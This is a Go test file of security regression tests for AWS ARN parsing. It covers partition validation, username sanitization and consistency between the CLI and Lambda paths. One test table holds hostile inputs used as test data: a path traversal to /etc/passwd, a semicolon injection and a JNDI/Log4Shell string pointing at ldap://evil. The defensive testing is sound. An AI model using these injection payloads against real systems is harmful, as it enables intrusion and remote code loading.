package identity

import (
	"testing"
)

// ============================================================================
// Security Regression Tests for Identity Hardening (Phase 130)
// ============================================================================
//
// These tests verify identity hardening changes:
// 1. Partition validation - all valid AWS partitions accepted, invalid rejected
// 2. ARN injection prevention - malicious ARN inputs are rejected
// 3. Identity extraction consistency - CLI and Lambda paths produce identical results
//
// Tests use TestSecurityRegression_ prefix for CI/CD filtering.
// ============================================================================

// TestSecurityRegression_PartitionValidation verifies all AWS partitions are validated correctly.
func TestSecurityRegression_PartitionValidation(t *testing.T) {
	validPartitions := []struct {
		name      string
		partition string
		userArn   string
		roleArn   string
	}{
		{
			name:      "aws (Commercial)",
			partition: "aws",
			userArn:   "arn:aws:iam::123456789012:user/alice",
			roleArn:   "arn:aws:sts::123456789012:assumed-role/MyRole/session",
		},
		{
			name:      "aws-cn (China)",
			partition: "aws-cn",
			userArn:   "arn:aws-cn:iam::123456789012:user/alice",
			roleArn:   "arn:aws-cn:sts::123456789012:assumed-role/MyRole/session",
		},
		{
			name:      "aws-us-gov (GovCloud)",
			partition: "aws-us-gov",
			userArn:   "arn:aws-us-gov:iam::123456789012:user/alice",
			roleArn:   "arn:aws-us-gov:sts::123456789012:assumed-role/MyRole/session",
		},
		{
			name:      "aws-iso (DoD Isolated Cloud)",
			partition: "aws-iso",
			userArn:   "arn:aws-iso:iam::123456789012:user/alice",
			roleArn:   "arn:aws-iso:sts::123456789012:assumed-role/MyRole/session",
		},
		{
			name:      "aws-iso-b (C2S Isolated Cloud)",
			partition: "aws-iso-b",
			userArn:   "arn:aws-iso-b:iam::123456789012:user/alice",
			roleArn:   "arn:aws-iso-b:sts::123456789012:assumed-role/MyRole/session",
		},
	}

	t.Run("valid_partitions_accepted", func(t *testing.T) {
		for _, tc := range validPartitions {
			t.Run(tc.name+"_user", func(t *testing.T) {
				identity, err := ParseARN(tc.userArn)
				if err != nil {
					t.Errorf("SECURITY VIOLATION: Valid partition %s rejected for user ARN: %v", tc.partition, err)
				}
				if identity == nil {
					t.Errorf("SECURITY VIOLATION: Valid partition %s returned nil identity for user ARN", tc.partition)
				}
			})

			t.Run(tc.name+"_assumed_role", func(t *testing.T) {
				identity, err := ParseARN(tc.roleArn)
				if err != nil {
					t.Errorf("SECURITY VIOLATION: Valid partition %s rejected for role ARN: %v", tc.partition, err)
				}
				if identity == nil {
					t.Errorf("SECURITY VIOLATION: Valid partition %s returned nil identity for role ARN", tc.partition)
				}
			})
		}
	})

	invalidPartitions := []struct {
		name      string
		partition string
		arn       string
	}{
		{
			name:      "aws-invalid",
			partition: "aws-invalid",
			arn:       "arn:aws-invalid:iam::123456789012:user/alice",
		},
		{
			name:      "amazon",
			partition: "amazon",
			arn:       "arn:amazon:iam::123456789012:user/alice",
		},
		{
			name:      "ec2",
			partition: "ec2",
			arn:       "arn:ec2:iam::123456789012:user/alice",
		},
		{
			name:      "empty",
			partition: "",
			arn:       "arn::iam::123456789012:user/alice",
		},
	}

	t.Run("invalid_partitions_rejected", func(t *testing.T) {
		for _, tc := range invalidPartitions {
			t.Run(tc.name, func(t *testing.T) {
				identity, err := ParseARN(tc.arn)
				if err == nil {
					t.Errorf("SECURITY VIOLATION: Invalid partition '%s' was accepted (got identity: %+v)", tc.partition, identity)
				}
			})
		}
	})
}

// TestSecurityRegression_ARNInjectionPrevention verifies injection attacks are blocked.
// The key security property is that after sanitization, usernames contain ONLY alphanumeric
// characters, which makes them safe for use in any context (policies, logging, SourceIdentity).
func TestSecurityRegression_ARNInjectionPrevention(t *testing.T) {
	maliciousARNs := []struct {
		name        string
		arn         string
		description string
	}{
		{
			name:        "path_traversal_etc_passwd",
			arn:         "arn:aws:iam::123456789012:user/../../../etc/passwd",
			description: "path traversal to /etc/passwd",
		},
		{
			name:        "semicolon_injection",
			arn:         "arn:aws:sts::123456789012:assumed-role/Role/session;admin",
			description: "semicolon command injection",
		},
		{
			name:        "null_byte_injection",
			arn:         "arn:aws:iam::123456789012:user/\x00nullbyte",
			description: "null byte injection",
		},
		{
			name:        "jndi_injection",
			arn:         "arn:aws:sts::123456789012:assumed-role/Role/${jndi:ldap://evil}",
			description: "JNDI/Log4Shell injection",
		},
		{
			name:        "quotes_injection",
			arn:         "arn:aws:sts::123456789012:assumed-role/Role/user\"admin",
			description: "quote injection",
		},
		{
			name:        "control_characters",
			arn:         "arn:aws:iam::123456789012:user/alice\t\n\radmin",
			description: "control character injection",
		},
		{
			name:        "unicode_homoglyphs",
			arn:         "arn:aws:iam::123456789012:user/\u0430lice",
			description: "Cyrillic 'a' homoglyph for 'alice'",
		},
		{
			name:        "newline_injection",
			arn:         "arn:aws:iam::123456789012:user/alice\nmalicious",
			description: "newline injection",
		},
	}

	for _, tc := range maliciousARNs {
		t.Run(tc.name, func(t *testing.T) {
			identity, err := ParseARN(tc.arn)

			// Either parsing should fail, or the username should be sanitized
			if err != nil {
				// Parsing failed - this is acceptable for security
				return
			}

			// If parsed successfully, verify the username is safe (alphanumeric only)
			// This is the critical security property - any malicious characters are removed
			for _, c := range identity.Username {
				if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
					t.Errorf("SECURITY VIOLATION: Username contains dangerous character %q after sanitization (%s)", c, tc.description)
				}
			}

			// Verify dangerous injection characters are NOT present
			// Note: We only check for actual dangerous characters, not English words
			// A sanitized username like "sessionadmin" is safe because all special characters are removed
			dangerousChars := []rune{';', '\x00', '"', '\t', '\n', '\r', '\'', '\\', '/', '$', '{', '}', ':', '@', '.'}
			for _, c := range identity.Username {
				for _, danger := range dangerousChars {
					if c == danger {
						t.Errorf("SECURITY VIOLATION: Username contains dangerous character %q after sanitization (%s)", c, tc.description)
					}
				}
			}
		})
	}
}

// containsPattern checks if s contains substr (case-sensitive).
func containsPattern(s, substr string) bool {
	if len(substr) == 0 {
		return false
	}
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// TestSecurityRegression_IdentityExtractionConsistency verifies CLI and Lambda produce same results.
// This test imports the lambda package's extractUsername indirectly by using identity.ExtractUsername,
// which is now the single source of truth for both CLI and Lambda.
func TestSecurityRegression_IdentityExtractionConsistency(t *testing.T) {
	testARNs := []struct {
		name         string
		arn          string
		wantUsername string
	}{
		{
			name:         "IAM user simple",
			arn:          "arn:aws:iam::123456789012:user/alice",
			wantUsername: "alice",
		},
		{
			name:         "IAM user with path",
			arn:          "arn:aws:iam::123456789012:user/admins/team1/alice",
			wantUsername: "alice",
		},
		{
			name:         "assumed role simple",
			arn:          "arn:aws:sts::123456789012:assumed-role/Role/session",
			wantUsername: "session",
		},
		{
			name:         "SSO user with email",
			arn:          "arn:aws:sts::123456789012:assumed-role/AWSReservedSSO_Admin_abc/user@company.com",
			wantUsername: "usercompanycom",
		},
		{
			name:         "federated user",
			arn:          "arn:aws:sts::123456789012:federated-user/feduser",
			wantUsername: "feduser",
		},
		{
			name:         "root user",
			arn:          "arn:aws:iam::123456789012:root",
			wantUsername: "root",
		},
		{
			name:         "GovCloud user",
			arn:          "arn:aws-us-gov:iam::123456789012:user/alice",
			wantUsername: "alice",
		},
		{
			name:         "China user",
			arn:          "arn:aws-cn:iam::123456789012:user/alice",
			wantUsername: "alice",
		},
		{
			name:         "ISO partition user",
			arn:          "arn:aws-iso:iam::123456789012:user/alice",
			wantUsername: "alice",
		},
		{
			name:         "ISO-B partition user",
			arn:          "arn:aws-iso-b:iam::123456789012:user/alice",
			wantUsername: "alice",
		},
	}

	for _, tc := range testARNs {
		t.Run(tc.name, func(t *testing.T) {
			// Test via ExtractUsername (used by CLI)
			username, err := ExtractUsername(tc.arn)
			if err != nil {
				t.Fatalf("ExtractUsername() error = %v", err)
			}

			if username != tc.wantUsername {
				t.Errorf("ExtractUsername(%q) = %q, want %q", tc.arn, username, tc.wantUsername)
			}

			// Test via ParseARN (full identity extraction)
			identity, err := ParseARN(tc.arn)
			if err != nil {
				t.Fatalf("ParseARN() error = %v", err)
			}

			if identity.Username != tc.wantUsername {
				t.Errorf("ParseARN(%q).Username = %q, want %q", tc.arn, identity.Username, tc.wantUsername)
			}

			// Verify both methods produce identical results
			if username != identity.Username {
				t.Errorf("SECURITY VIOLATION: ExtractUsername() = %q but ParseARN().Username = %q - inconsistent extraction!", username, identity.Username)
			}
		})
	}
}

// TestSecurityRegression_UsernameSanitization verifies usernames are properly sanitized.
func TestSecurityRegression_UsernameSanitization(t *testing.T) {
	tests := []struct {
		name         string
		arn          string
		wantUsername string
		description  string
	}{
		{
			name:         "email_sanitized",
			arn:          "arn:aws:sts::123456789012:assumed-role/Role/user@domain.com",
			wantUsername: "userdomaincom",
			description:  "@ and . removed from email",
		},
		{
			name:         "dots_removed",
			arn:          "arn:aws:sts::123456789012:assumed-role/Role/user.name",
			wantUsername: "username",
			description:  "dots removed",
		},
		{
			name:         "underscores_removed",
			arn:          "arn:aws:sts::123456789012:federated-user/user_name",
			wantUsername: "username",
			description:  "underscores removed",
		},
		{
			name:         "hyphens_removed",
			arn:          "arn:aws:sts::123456789012:assumed-role/Role/user-name",
			wantUsername: "username",
			description:  "hyphens removed",
		},
		{
			name:         "plus_sign_removed",
			arn:          "arn:aws:sts::123456789012:assumed-role/Role/user+test@domain.com",
			wantUsername: "usertestdomaincom",
			description:  "+ removed from email",
		},
		{
			name:         "truncation_to_20_chars",
			arn:          "arn:aws:sts::123456789012:assumed-role/Role/verylongusernamethatexceedstwentycharacters",
			wantUsername: "verylongusernamethat",
			description:  "truncated to 20 characters",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			username, err := ExtractUsername(tc.arn)
			if err != nil {
				t.Fatalf("ExtractUsername() error = %v", err)
			}

			if username != tc.wantUsername {
				t.Errorf("ExtractUsername() = %q, want %q (%s)", username, tc.wantUsername, tc.description)
			}

			// Verify username contains only alphanumeric characters
			for _, c := range username {
				if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9')) {
					t.Errorf("SECURITY VIOLATION: Username contains special character %q (%s)", c, tc.description)
				}
			}
		})
	}
}

// TestSecurityRegression_EmptyAndInvalidARN verifies proper error handling.
func TestSecurityRegression_EmptyAndInvalidARN(t *testing.T) {
	tests := []struct {
		name    string
		arn     string
		wantErr bool
	}{
		{
			name:    "empty_arn",
			arn:     "",
			wantErr: true,
		},
		{
			name:    "not_an_arn",
			arn:     "not-an-arn",
			wantErr: true,
		},
		{
			name:    "partial_arn",
			arn:     "arn:aws:iam::123456789012",
			wantErr: true,
		},
		{
			name:    "missing_resource",
			arn:     "arn:aws:iam::123456789012:",
			wantErr: true,
		},
		{
			name:    "invalid_account_id",
			arn:     "arn:aws:iam::12345:user/alice",
			wantErr: true,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			_, err := ExtractUsername(tc.arn)
			if tc.wantErr && err == nil {
				t.Errorf("ExtractUsername(%q) expected error, got nil", tc.arn)
			}
			if !tc.wantErr && err != nil {
				t.Errorf("ExtractUsername(%q) unexpected error = %v", tc.arn, err)
			}
		})
	}
}
